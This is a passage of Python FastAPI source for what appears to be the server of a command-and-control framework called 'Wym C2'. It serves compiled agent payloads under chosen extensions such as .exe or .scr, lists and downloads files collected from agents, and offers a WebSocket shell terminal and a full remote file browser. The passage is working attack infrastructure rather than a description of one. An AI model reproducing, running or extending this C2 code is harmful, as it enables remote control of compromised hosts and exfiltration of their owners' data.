                cleared += 1
            except OSError:
                pass
        try:
            if BUILD_HISTORY_FILE.is_file():
                BUILD_HISTORY_FILE.unlink()
        except OSError:
            pass
    return {"cleared": cleared}


@app.get("/download/build/{language}", include_in_schema=False)
async def download_build(request: Request, language: str, target: str = "win_x64",
                         token: str = "", ext: str = ""):
    user = get_current_user(request)
    if not user:
        hdr = request.headers.get("x-agent-token", "")
        tok = token or hdr
        expected = app.state.agent_token
        if not expected or not tok or not secrets.compare_digest(tok, expected):
            raise HTTPException(status_code=401, detail="authentication required")
    t = BUILD_TARGETS.get(target)
    if not t:
        raise HTTPException(status_code=400, detail="unknown target")
    # on-disk artifact carries the platform default extension plus the source-
    # id suffix; the served filename may carry a requested (.exe/.scr/.out/…)
    # extension instead. Java artifacts are unique per build (src-id +
    # timestamp): serve the newest, or an exact one named via ?name=.
    build_id = _source_hash(language)[:8]
    if language == "java":
        req_name = (request.query_params.get("name") or "").strip()
        if req_name:
            p = BUILDS_DIR / req_name
            if not re.fullmatch(r"wym_java_[0-9a-f]{8}_\d{8}-\d{6}\.jar", req_name) \
                    or not p.is_file():
                raise HTTPException(status_code=404, detail="binary not found")
            path = p
        else:
            cands = sorted(BUILDS_DIR.glob(f"wym_java_{build_id}_*.jar"))
            if not cands:
                raise HTTPException(status_code=404,
                                    detail="binary not found — build first")
            path = cands[-1]
        fname = path.name
    else:
        path = BUILDS_DIR / _artifact_name(language, target, t["ext"], build_id)
        fname = _artifact_name(language, target, ext or t["ext"], build_id)
        if not path.is_file():
            raise HTTPException(status_code=404, detail="binary not found — build first")
    return FileResponse(path, media_type="application/octet-stream", filename=fname)


# --------------------------------------------------------------------------
# Shared / collected file management (dashboard)
# --------------------------------------------------------------------------

@app.get("/stuff", include_in_schema=False)
async def stuff_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    shared = sorted(
        (p.name, p.stat().st_size) for p in SHARED_DIR.iterdir() if p.is_file()
    )
    collected = sorted(
        (p.name, p.stat().st_size, p.stat().st_mtime)
        for p in COLLECTED_DIR.iterdir() if p.is_file()
    )
    return templates.TemplateResponse(
        request, "stuff.html", {"user": user, "shared": shared, "collected": collected}
    )


@app.get("/shared", include_in_schema=False)
async def shared_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    files = sorted(
        (p.name, p.stat().st_size) for p in SHARED_DIR.iterdir() if p.is_file()
    )
    return templates.TemplateResponse(request, "shared.html", {"user": user, "files": files})


@app.post("/shared/upload", include_in_schema=False)
async def shared_upload(request: Request, file: UploadFile = File(...)):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    safe_name = Path(file.filename or "upload.bin").name
    with (SHARED_DIR / safe_name).open("wb") as fh:
        _copy_limited(file.file, fh)
    return RedirectResponse("/stuff", status_code=303)


@app.post("/shared/delete", include_in_schema=False)
async def shared_delete(request: Request, name: str = Form(...)):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    path = SHARED_DIR / Path(name).name
    if path.is_file():
        path.unlink()
    return RedirectResponse("/stuff", status_code=303)


@app.get("/collected", include_in_schema=False)
async def collected_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    files = sorted(
        (p.name, p.stat().st_size, p.stat().st_mtime)
        for p in COLLECTED_DIR.iterdir() if p.is_file()
    )
    return templates.TemplateResponse(request, "collected.html", {"user": user, "files": files})


@app.post("/collected/delete", include_in_schema=False)
async def collected_delete(request: Request, name: str = Form(...),
                           redirect: str = Form("")):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    path = COLLECTED_DIR / Path(name).name
    if path.is_file():
        path.unlink()
    # Only allow internal redirects (agent detail pages) — block open redirects.
    if redirect.startswith("/agents/"):
        return RedirectResponse(redirect, status_code=303)
    return RedirectResponse("/stuff", status_code=303)


@app.get("/collected/{filename}", include_in_schema=False)
async def collected_download(request: Request, filename: str):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    path = COLLECTED_DIR / Path(filename).name
    if not path.is_file():
        raise HTTPException(status_code=404, detail="file not found")
    return FileResponse(path, filename=Path(filename).name)


# --------------------------------------------------------------------------
# Info page — server system information
# --------------------------------------------------------------------------

def _get_system_info() -> dict:
    """Gather comprehensive server system information."""
    info = {}

    # OS
    info["os_name"] = platform.system()
    info["os_release"] = platform.release()
    info["os_version"] = platform.version()
    info["os_platform"] = platform.platform()
    info["architecture"] = platform.machine()
    info["python_version"] = platform.python_version()
    info["hostname"] = platform.node()
    info["username"] = os.getenv("USERNAME") or os.getenv("USER") or "unknown"

    # About
    info["about"] = {
        "name": "Wym C2",
        "version": app.version,
        "description": "Wym C2 are What you missed is Command and Control Frameworks",
        "base_url": os.environ.get("C2_HOST", "0.0.0.0") + ":" + str(int(os.environ.get("C2_PORT", "8000"))),
        "agents_languages": ", ".join(sorted(AGENT_FILES.keys())),
        "compiled_languages": ", ".join(sorted(COMPILED_LANGUAGES)),
    }

    # Processor
    info["cpu_count"] = psutil.cpu_count(logical=False) or 0
    info["cpu_count_logical"] = psutil.cpu_count(logical=True) or 0
    info["cpu_freq"] = None
    freq = psutil.cpu_freq()
    if freq:
        info["cpu_freq"] = {"current": freq.current, "min": freq.min, "max": freq.max}
    info["cpu_percent"] = psutil.cpu_percent(interval=0.5)

    # Memory
    mem = psutil.virtual_memory()
    info["mem_total"] = mem.total
    info["mem_available"] = mem.available
    info["mem_used"] = mem.used
    info["mem_percent"] = mem.percent
    swap = psutil.swap_memory()
    info["swap_total"] = swap.total
    info["swap_used"] = swap.used
    info["swap_percent"] = swap.percent

    # Disk
    disks = []
    for part in psutil.disk_partitions(all=False):
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disks.append({
                "device": part.device,
                "mount": part.mountpoint,
                "fstype": part.fstype,
                "total": usage.total,
                "used": usage.used,
                "free": usage.free,
                "percent": usage.percent,
            })
        except (PermissionError, OSError):
            continue
    info["disks"] = disks

    # Uptime
    boot = datetime.fromtimestamp(psutil.boot_time())
    uptime = datetime.now() - boot
    info["boot_time"] = boot.strftime("%Y-%m-%d %H:%M:%S")
    info["uptime_days"] = uptime.days
    info["uptime_hours"] = uptime.seconds // 3600
    info["uptime_minutes"] = (uptime.seconds % 3600) // 60

    # Network
    net_if = psutil.net_if_addrs()
    net_io = psutil.net_io_counters()
    interfaces = []
    for iface, addrs in net_if.items():
        ipv4 = ""
        ipv6 = ""
        mac = ""
        for a in addrs:
            if a.family.name == "AF_INET":
                ipv4 = a.address
            elif a.family.name == "AF_INET6":
                ipv6 = a.address
            elif a.family.name == "AF_LINK":
                mac = a.address
        interfaces.append({"name": iface, "ipv4": ipv4, "ipv6": ipv6, "mac": mac})
    info["network"] = {
        "interfaces": interfaces,
        "bytes_sent": net_io.bytes_sent,
        "bytes_recv": net_io.bytes_recv,
        "packets_sent": net_io.packets_sent,
        "packets_recv": net_io.packets_recv,
    }

    # Database
    try:
        from database import DB_PATH
        db_size = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
        conn = get_conn()
        try:
            agent_count = conn.execute("SELECT COUNT(*) as c FROM agents").fetchone()["c"]
            task_count = conn.execute("SELECT COUNT(*) as c FROM tasks").fetchone()["c"]
            token_count = conn.execute("SELECT COUNT(*) as c FROM tokens").fetchone()["c"]
            user_count = conn.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
        finally:
            conn.close()
        info["db"] = {
            "path": DB_PATH,
            "size": db_size,
            "agents": agent_count,
            "tasks": task_count,
            "tokens": token_count,
            "users": user_count,
        }
    except Exception:
        info["db"] = {}

    # Package versions
    packages = {}
    for pkg in ["fastapi", "uvicorn", "jinja2", "psutil", "pydantic"]:
        try:
            mod = __import__(pkg if pkg != "jinja2" else "jinja2")
            ver = getattr(mod, "__version__", "?")
            if pkg == "jinja2":
                ver = mod.__version__
            packages[pkg] = ver
        except ImportError:
            packages[pkg] = "not installed"
    info["packages"] = packages

    return info


@app.get("/info", include_in_schema=False)
async def info_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    info = _get_system_info()
    return templates.TemplateResponse(request, "info.html", {"user": user, "info": info})


# --------------------------------------------------------------------------
# Terminal (Server) — web shell via WebSocket
# --------------------------------------------------------------------------

@app.get("/terminal", include_in_schema=False)
async def terminal_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    return templates.TemplateResponse(request, "terminal.html", {"user": user})


@app.websocket("/ws/terminal")
async def ws_terminal(websocket: WebSocket, token: str = ""):
    # deny cross-origin websocket hijack (defense-in-depth; the session cookie
    # is SameSite=Lax so cross-site handshakes carry no cookie anyway)
    origin = websocket.headers.get("origin", "")
    host = websocket.headers.get("host", "")
    if origin:
        o = urllib.parse.urlsplit(origin)
        if o.netloc and o.netloc != host:
            await websocket.close(code=4001)
            return
    session_user = auth.get_session_user(token) if token else None
    if not session_user:
        session_user = auth.get_session_user(
            websocket.cookies.get(auth.COOKIE_NAME, "")
        )
    if not session_user:
        await websocket.close(code=4001)
        return

    await websocket.accept()

    if sys.platform == "win32" and HAS_WINPTY:
        # winpty PTY mode — proper terminal emulation with echo
        pty_proc = None
        try:
            pty_proc = await asyncio.to_thread(
                _winpty.PtyProcess.spawn,
                ["powershell.exe", "-NoLogo"],
                dimensions=(24, 120),
            )

            async def read_input():
                try:
                    while True:
                        data = await websocket.receive_text()
                        # Handle resize messages
                        if data.startswith('{'):
                            try:
                                msg = json.loads(data)
                                if msg.get("type") == "resize":
                                    cols = int(msg.get("cols", 120))
                                    rows = int(msg.get("rows", 24))
                                    await asyncio.to_thread(pty_proc.setwinsize, rows, cols)
                                    continue
                            except (json.JSONDecodeError, ValueError):
                                pass
                        await asyncio.to_thread(pty_proc.write, data)
                except WebSocketDisconnect:
                    pass
                except Exception:
                    pass

            async def read_output():
                try:
                    while True:
                        data = await asyncio.to_thread(pty_proc.read, 65536)
                        if not data:
                            break
                        await websocket.send_text(data)
                except Exception:
                    pass

            await asyncio.gather(read_input(), read_output())
        except Exception as e:
            try:
                await websocket.send_text(f"\x1b[31mError: {e}\x1b[0m\n")
            except Exception:
                pass
        finally:
            if pty_proc:
                try:
                    pty_proc.close()
                except Exception:
                    pass
    else:
        # POSIX PTY mode — real terminal emulation with echo (Linux/macOS)
        import fcntl
        import pty as pty_mod
        import struct
        import termios

        shell = os.environ.get("SHELL", "/bin/bash")
        master_fd = None
        proc = None
        try:
            master_fd, slave_fd = pty_mod.openpty()

            def _spawn():
                p = subprocess.Popen(
                    [shell],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    close_fds=True,
                    start_new_session=True,
                )
                os.close(slave_fd)
                return p

            proc = await asyncio.to_thread(_spawn)

            def _set_size(cols, rows):
                try:
                    fcntl.ioctl(
                        master_fd,
                        termios.TIOCSWINSZ,
                        struct.pack("HHHH", int(rows), int(cols), 0, 0),
                    )
                except Exception:
                    pass

            _set_size(120, 24)

            async def read_input():
                try:
                    while True:
                        data = await websocket.receive_text()
                        if data.startswith("{"):
                            try:
                                msg = json.loads(data)
                                if msg.get("type") == "resize":
                                    _set_size(int(msg.get("cols", 120)), int(msg.get("rows", 24)))
                                    continue
                            except (json.JSONDecodeError, ValueError, TypeError):
                                pass
                        os.write(master_fd, data.encode())
                except Exception:
                    pass

            async def read_output():
                try:
                    while True:
                        data = await asyncio.to_thread(os.read, master_fd, 65536)
                        if not data:
                            break
                        await websocket.send_text(data.decode(errors="replace"))
                except Exception:
                    pass

            await asyncio.gather(read_input(), read_output())
        except Exception as e:
            try:
                await websocket.send_text(f"\x1b[31mError: {e}\x1b[0m\n")
            except Exception:
                pass
        finally:
            if master_fd is not None:
                try:
                    os.close(master_fd)
                except Exception:
                    pass
            if proc:
                try:
                    proc.terminate()
                except Exception:
                    pass


# --------------------------------------------------------------------------
# Explorer (Server) — file browser
# --------------------------------------------------------------------------

@app.get("/explorer", include_in_schema=False)
async def explorer_page(request: Request, path: str = ""):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    target = _exp_default(path)
    parent = str(target.parent) if target != target.parent else ""
    breadcrumbs = []
    parts = target.parts
    if sys.platform == "win32" and parts:
        cur = parts[0]
        breadcrumbs.append({"label": parts[0], "path": cur})
        for part in parts[1:]:
            cur = os.path.join(cur, part)
            breadcrumbs.append({"label": part, "path": cur})
    else:
        cur = os.sep  # POSIX: "/"
        for part in parts:
            if part == os.sep or part == "":
                continue
            cur = os.path.join(cur, part)
            breadcrumbs.append({"label": part, "path": cur})
    drives = []
    if sys.platform == "win32":
        import string as _string
        for _letter in _string.ascii_uppercase:
            _d = f"{_letter}:\\"
            if os.path.exists(_d):
                drives.append({"label": _letter + ":", "path": _d})
    else:
        drives = [{"label": "/", "path": "/"}]
    entries = []
    try:
        items = list(target.iterdir())
    except PermissionError:
        items = []

    def _safe_sort_key(p):
        try:
            is_dir = p.is_dir()
        except OSError:
            is_dir = False
        return (not is_dir, p.name.lower())

    try:
        for item in sorted(items, key=_safe_sort_key):
            try:
                st = item.stat()
                is_dir = item.is_dir()
                entry = {
                    "name": item.name,
                    "path": str(item),
                    "is_dir": is_dir,
                    "size": st.st_size if not is_dir else 0,
                    "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    "mode": oct(st.st_mode)[-3:],
                }
                if sys.platform != "win32":
                    try:
                        import grp, pwd
                        entry["owner"] = pwd.getpwuid(st.st_uid).pw_name
                        entry["group"] = grp.getgrgid(st.st_gid).gr_name
                    except (KeyError, ImportError):
                        entry["owner"] = str(st.st_uid)
                        entry["group"] = str(st.st_gid)
                else:
                    entry["owner"] = os.getenv("USERNAME", "")
                    entry["group"] = ""
                entries.append(entry)
            except (PermissionError, OSError):
                entries.append({
                    "name": item.name,
                    "path": str(item),
                    "is_dir": False,
                    "size": 0,
                    "mtime": "?",
                    "mode": "---",
                    "owner": "",
                    "group": "",
                })
    except PermissionError:
        entries = []
    return templates.TemplateResponse(
        request, "explorer.html",
        {"user": user, "cwd": str(target), "parent": parent, "entries": entries, "breadcrumbs": breadcrumbs, "drives": drives, "is_windows": sys.platform == "win32"},
    )


@app.get("/explorer/read", include_in_schema=False)
async def explorer_read(request: Request, path: str = ""):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not path:
        raise HTTPException(status_code=400, detail="path required")
    target = _exp_path(path)
    if not target.is_file():
        raise HTTPException(status_code=400, detail="not a file")
    if target.stat().st_size > 2 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="file too large (>2MB)")
    try:
        content = target.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"path": str(target), "content": content, "size": target.stat().st_size}


# --------------------------------------------------------------------------
# Explorer API for DevExtreme File Manager
# --------------------------------------------------------------------------

@app.get("/api/explorer/items")
async def explorer_api_items(request: Request, path: str = ""):
    """List items in a directory."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    target = _exp_default(path)
    if not target.is_dir():
        return []
    items = []
    try:
        child_list = list(target.iterdir())
    except PermissionError:
        return []
    for item in child_list:
        if _exp_blocked(item):
            continue
        try:
            is_dir = item.is_dir()
            st = item.stat()
            entry = {
                "name": item.name,
                "isDirectory": is_dir,
                "size": 0 if is_dir else st.st_size,
                "dateModified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%dT%H:%M:%S"),
                "path": str(item),
                "mode": oct(st.st_mode)[-3:],
            }
            if sys.platform != "win32":
                try:
                    import grp, pwd
                    entry["owner"] = pwd.getpwuid(st.st_uid).pw_name
                    entry["group"] = grp.getgrgid(st.st_gid).gr_name
                except (KeyError, ImportError):
                    entry["owner"] = str(st.st_uid)
                    entry["group"] = str(st.st_gid)
            else:
                entry["owner"] = os.getenv("USERNAME", "")
                entry["group"] = ""
            items.append(entry)
        except (PermissionError, OSError):
            items.append({
                "name": item.name,
                "isDirectory": False,
                "size": 0,
                "dateModified": "",
                "path": str(item),
                "mode": "---",
                "owner": "",
                "group": "",
            })
    return items


@app.get("/api/explorer/directories")
async def explorer_api_dirs(request: Request, path: str = ""):
    """List subdirectories for tree view."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    target = _exp_default(path)
    if not target.is_dir():
        return []
    dirs = []
    try:
        for item in sorted(target.iterdir(), key=lambda p: p.name.lower()):
            try:
                if item.is_dir() and not item.name.startswith('.') and not _exp_blocked(item):
                    dirs.append({
                        "name": item.name,
                        "isDirectory": True,
                        "path": str(item),
                    })
            except (PermissionError, OSError):
                pass
    except PermissionError:
        pass
    return dirs


@app.get("/api/explorer/file")
async def explorer_api_file(request: Request, path: str = ""):
    """Read file content."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not path:
        raise HTTPException(status_code=400, detail="path required")
    target = _exp_path(path)
    if not target.is_file():
        raise HTTPException(status_code=400, detail="not a file")
    if target.stat().st_size > 5 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="file too large (>5MB)")
    try:
        content = target.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"name": target.name, "content": content, "size": target.stat().st_size, "path": str(target)}


@app.post("/api/explorer/upload")
async def explorer_api_upload(
    request: Request,
    file: UploadFile = File(...),
    destination: str = Form(""),
):
    """Upload a file to the server."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    dest = _exp_default(destination)
    if not dest.is_dir():
        dest = dest.parent
    safe_name = Path(file.filename or "upload.bin").name
    target = dest / safe_name
    with target.open("wb") as fh:
        _copy_limited(file.file, fh)
    return {"success": True, "name": safe_name, "path": str(target)}


@app.post("/api/explorer/mkdir")
async def explorer_api_mkdir(request: Request):
    """Create a new directory."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    body = await request.json()
    name = body.get("name", "").strip()
    parent = body.get("parentPath", "")
    if not name:
        raise HTTPException(status_code=400, detail="name required")
    target = _exp_default(parent)
    new_dir = target / name
    if new_dir.exists():
        raise HTTPException(status_code=400, detail="already exists")
    new_dir.mkdir()
    return {"success": True, "name": name, "path": str(new_dir)}


@app.post("/api/explorer/rename")
async def explorer_api_rename(request: Request):
    """Rename a file or directory."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    body = await request.json()
    old_name = body.get("oldName", "")
    new_name = body.get("newName", "")
    dir_path = body.get("path", "")
    if not old_name or not new_name:
        raise HTTPException(status_code=400, detail="old/new name required")
    parent = _exp_default(dir_path)
    src = parent / old_name
    dst = parent / new_name
    if not src.exists():
        raise HTTPException(status_code=404, detail="not found")
    src.rename(dst)
    return {"success": True, "name": new_name, "path": str(dst)}


@app.post("/api/explorer/delete")
async def explorer_api_delete(request: Request):
    """Delete a file or directory."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    body = await request.json()
    name = body.get("name", "")
    dir_path = body.get("path", "")
    if not name:
        raise HTTPException(status_code=400, detail="name required")
    parent = _exp_default(dir_path)
    target = parent / name
    if not target.exists():
        raise HTTPException(status_code=404, detail="not found")
    if target.is_dir():
        shutil.rmtree(target)
    else:
        target.unlink()
    return {"success": True}


@app.post("/api/explorer/chmod")
async def explorer_api_chmod(request: Request):
    """Change file permissions (chmod)."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    body = await request.json()
    path = body.get("path", "")
    mode = body.get("mode", "")
    if not path or not mode:
        raise HTTPException(status_code=400, detail="path and mode required")
    target = _exp_path(path)
    if not target.exists():
        raise HTTPException(status_code=404, detail="not found")
    try:
        mode_int = int(mode, 8) if mode.startswith("0") else int(mode)
        os.chmod(str(target), mode_int)
    except (ValueError, OSError) as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"success": True, "mode": oct(mode_int)}


@app.post("/api/explorer/chown")
async def explorer_api_chown(request: Request):
    """Change file owner (Unix only)."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if sys.platform == "win32":
        raise HTTPException(status_code=400, detail="chown not supported on Windows")
    body = await request.json()
    path = body.get("path", "")
    owner = body.get("owner", "")
    group = body.get("group", "")
    if not path or (not owner and not group):
        raise HTTPException(status_code=400, detail="path and owner/group required")
    target = _exp_path(path)
    if not target.exists():
        raise HTTPException(status_code=404, detail="not found")
    try:
        import grp, pwd
        uid = os.stat(target).st_uid
        gid = os.stat(target).st_gid
        if owner:
            uid = pwd.getpwnam(owner).pw_uid
        if group:
            gid = grp.getgrnam(group).gr_gid
        os.chown(str(target), uid, gid)
    except KeyError as e:
        raise HTTPException(status_code=400, detail=f"{e.args[0]} not found")
    except OSError as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"success": True}


@app.get("/api/explorer/stat")
async def explorer_api_stat(request: Request, path: str = ""):
    """Get file/dir stat info (permissions, owner, size)."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not path:
        raise HTTPException(status_code=400, detail="path required")
    target = _exp_path(path)
    if not target.exists():
        raise HTTPException(status_code=404, detail="not found")
    try:
        st = target.stat()
        result = {
            "mode": oct(st.st_mode)[-3:],
            "mode_full": oct(st.st_mode),
            "size": st.st_size,
            "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%dT%H:%M:%S"),
        }
        if sys.platform != "win32":
            import pwd, grp
            try:
                result["owner"] = pwd.getpwuid(st.st_uid).pw_name
            except KeyError:
                result["owner"] = str(st.st_uid)
            try:
                result["group"] = grp.getgrgid(st.st_gid).gr_name
            except KeyError:
                result["group"] = str(st.st_gid)
        else:
            result["owner"] = os.getenv("USERNAME", "")
            result["group"] = ""
        return result
    except OSError as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/explorer/users-groups")
async def explorer_api_users_groups(request: Request):
    """List POSIX users and groups for the chown dialog (Unix only)."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    users, groups = [], []
    if sys.platform != "win32":
        try:
            import grp, pwd
            users = sorted(u.pw_name for u in pwd.getpwall())
            groups = sorted(g.gr_name for g in grp.getgrall())
        except Exception:
            pass
    return {"users": users, "groups": groups}


@app.get("/api/explorer/download")
async def explorer_api_download(request: Request, path: str = ""):
    """Download a file, or download a directory as a gzip-compressed tar archive."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not path:
        raise HTTPException(status_code=400, detail="path required")
    target = _exp_path(path)
    if not target.exists():
        raise HTTPException(status_code=404, detail="not found")
    if target.is_dir():
        buf = io.BytesIO()
        try:
            with tarfile.open(fileobj=buf, mode="w:gz") as tar:
                tar.add(target, arcname=target.name)
        except (OSError, tarfile.TarError) as e:
            raise HTTPException(status_code=500, detail=str(e))
        buf.seek(0)
        filename = target.name.rstrip("/\\") or "folder"
        return StreamingResponse(
            buf,
            media_type="application/gzip",
            headers={"Content-Disposition": f'attachment; filename="{filename}.tar.gz"'},
        )
    return FileResponse(target, filename=target.name)


@app.post("/api/explorer/edit")
async def explorer_api_edit(request: Request):
    """Save edited text back to a server file."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    body = await request.json()
    path = body.get("path", "")
    content = body.get("content", "")
    if not path:
        raise HTTPException(status_code=400, detail="path required")
    target = _exp_path(path)
    if not target.is_file():
        raise HTTPException(status_code=404, detail="not a file")
    try:
        target.write_text(content, encoding="utf-8")
    except OSError as e:
        raise HTTPException(status_code=500, detail=str(e))
    return {"success": True, "path": str(target)}


# --------------------------------------------------------------------------
# User management (multi-user support)
# --------------------------------------------------------------------------

@app.get("/users", include_in_schema=False)
async def users_page(request: Request, ok: str = "", err: str = ""):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if not auth.is_admin(user):
        return RedirectResponse("/account", status_code=303)
    users = auth.list_users()
    return templates.TemplateResponse(
        request, "users.html",
        {"user": user, "users": users, "error": err or None, "ok": ok or None},
    )


@app.post("/users/create", include_in_schema=False)
async def users_create(
    request: Request,
    new_username: str = Form(...),
    new_password: str = Form(...),
    current_password: str = Form(""),
):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    users = auth.list_users()
    if not auth.is_admin(user):
        return RedirectResponse("/account", status_code=303)
    if not auth.authenticate(user, current_password):
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": users, "error": "Re-authentication failed — enter your password to manage users", "ok": None},
            status_code=400,
        )
    ok, err = auth.create_user(new_username, new_password)
    if not ok:
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": users, "error": err, "ok": None},
            status_code=400,
        )
    users = auth.list_users()
    return templates.TemplateResponse(
        request, "users.html",
        {"user": user, "users": users, "error": None, "ok": f"User '{new_username}' created"},
    )


@app.post("/users/delete", include_in_schema=False)
async def users_delete(request: Request, del_username: str = Form(...), current_password: str = Form("")):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if not auth.is_admin(user):
        return RedirectResponse("/account", status_code=303)
    if not auth.authenticate(user, current_password):
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": auth.list_users(), "error": "Re-authentication failed — enter your password to manage users", "ok": None},
            status_code=400,
        )
    if del_username == user:
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": auth.list_users(), "error": "Cannot delete yourself", "ok": None},
            status_code=400,
        )
    ok = auth.delete_user(del_username)
    if not ok:
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": auth.list_users(), "error": "Cannot delete — must keep at least one user", "ok": None},
            status_code=400,
        )
    return templates.TemplateResponse(
        request, "users.html",
        {"user": user, "users": auth.list_users(), "error": None, "ok": f"User '{del_username}' deleted"},
    )


@app.post("/users/password", include_in_schema=False)
async def users_set_password(
    request: Request,
    target_user: str = Form(...),
    set_password: str = Form(...),
    current_password: str = Form(""),
):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if not auth.is_admin(user):
        return RedirectResponse("/account", status_code=303)
    if not auth.authenticate(user, current_password):
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": auth.list_users(), "error": "Re-authentication failed — enter your password to manage users", "ok": None},
            status_code=400,
        )
    if len(set_password) < 8:
        return templates.TemplateResponse(
            request, "users.html",
            {"user": user, "users": auth.list_users(), "error": "Password must be at least 8 characters", "ok": None},
            status_code=400,
        )
    auth.change_password(target_user, set_password)
    return templates.TemplateResponse(
        request, "users.html",
        {"user": user, "users": auth.list_users(), "error": None, "ok": f"Password updated for '{target_user}'"},
    )


class _QuietSourceMaps(logging.Filter):
    """Drop browser source-map 404 noise from the uvicorn access log.

    DevTools fires GET /sm/<hash>.map and /static/xterm/*.js.map while a page
    is open; none of those exist server-side, so every page load logs fake 404
    lines that drown real errors. Filtering on the interpolated message keeps
    the access log for everything else intact.
    """

    def filter(self, record: logging.LogRecord) -> bool:
        try:
            msg = record.getMessage()
        except Exception:
            return True
        if "404" not in msg or ".map" not in msg:
            return True
        return False


def _build_log_config():
    """uvicorn log config with the browser source-map noise filtered out."""
    try:
        from uvicorn.config import LOGGING_CONFIG as _uses_uvicorn_config
    except Exception:  # pragma: no cover - older uvicorn fallback
        _uses_uvicorn_config = None

    if _uses_uvicorn_config is None:
        # No uvicorn LOGGING_CONFIG to build on; let uvicorn keep its defaults.
        return None

    config = copy.deepcopy(_uses_uvicorn_config)
    config.setdefault("filters", {})["quiet_source_maps"] = {
        "()": f"{_QuietSourceMaps.__module__}.{_QuietSourceMaps.__qualname__}",
    }
    for handler in config.get("handlers", {}).values():
        if handler.get("formatter") in ("access", "default"):
            handler.setdefault("filters", []).append("quiet_source_maps")
    return config


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    uvicorn.run(
        "main:app",
        host=os.environ.get("C2_HOST", "127.0.0.1"),
        port=int(os.environ.get("C2_PORT", "8000")),
        log_level="info",
        log_config=_build_log_config(),
    )
